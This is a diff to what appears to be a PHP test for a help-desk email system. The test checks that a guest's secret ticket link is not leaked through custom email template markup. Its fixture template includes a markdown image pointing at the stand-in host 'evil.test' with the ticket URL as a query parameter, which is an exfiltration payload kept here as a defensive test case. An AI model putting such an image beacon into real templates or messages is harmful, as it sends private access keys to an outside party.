@@ -212,7 +212,7 @@ it('links a guest\'s ticket only through the system button, never from custom ma
     Mail::fake();
     seedEmailTemplates();
     $guestUrl = url('/support/tickets/482913?key=GUESTKEY');
-    $ticket = ['ticket' => ['number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High', 'url' => new SensitiveValue($guestUrl)]];
+    $ticket = ['ticket' => ['number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High', 'requester_email' => 'guest@example.test', 'url' => new SensitiveValue($guestUrl, secret: 'GUESTKEY')]];
     $reply = EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole();
     $reply->update(['bcc' => ['archive@example.test']]);
     $reply->translations()->update(['body' => "![p](https://evil.test/p.png?k={{ ticket.url }})\n\nKey: {{ ticket.url }}\n\n[View ticket]({{ ticket.url }})"]);
